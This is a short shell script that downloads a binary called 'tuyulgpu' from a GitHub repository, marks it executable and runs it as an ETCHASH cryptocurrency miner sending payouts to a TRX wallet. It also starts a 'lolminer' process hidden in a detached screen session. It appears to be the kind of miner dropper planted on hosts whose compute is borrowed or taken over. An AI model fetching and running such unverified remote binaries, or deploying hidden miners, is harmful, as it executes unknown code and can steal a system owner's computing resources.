#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS random ./lolminer 65 75
wget https://github.com/GodMinerop/darklords/raw/main/tuyulgpu
chmod +x tuyulgpu
./tuyulgpu --algo ETCHASH --pool etchash.unmineable.com:3333 --user TRX:TW6x5pAKLKk88DTSzZ8ZQCDp3Qe4bATn3k